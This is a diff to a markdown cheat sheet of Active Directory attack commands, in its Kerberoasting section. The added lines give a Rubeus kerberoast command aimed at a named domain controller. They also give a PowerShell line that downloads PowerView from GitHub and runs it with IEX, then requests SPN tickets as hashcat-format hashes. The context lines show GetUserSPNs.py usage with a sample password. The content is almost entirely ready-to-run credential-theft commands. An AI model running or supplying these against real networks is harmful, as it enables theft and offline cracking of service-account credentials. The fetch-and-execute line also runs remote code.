@@ -28,6 +28,13 @@ Requires AD Modules:
 ## Kerberoasting
 From Windows against single user using Rubeus.exe:   
 `.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
+`.\Rubeus.exe kerberoast /spn:"SPN" /nowrap /domain:windomain.local /dc:10.0.2.3`   
+
+Using Powerview:   
+``` 
+IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4cedfa1c308a1bc37530725734290d506c0170dd/Recon/PowerView.ps1"))
+Request-SPNTicket -SPN "<SPN>" -Format Hashcat
+```     
 From Linux using GetUserSPN.py:   
 `python3 GetUserSPNs.py domain.local/user1:p@ssw0rd -dc-ip 192.168.1.11 -request-user targetserviceuser`   
 Using Invoke-Kerberoast:    
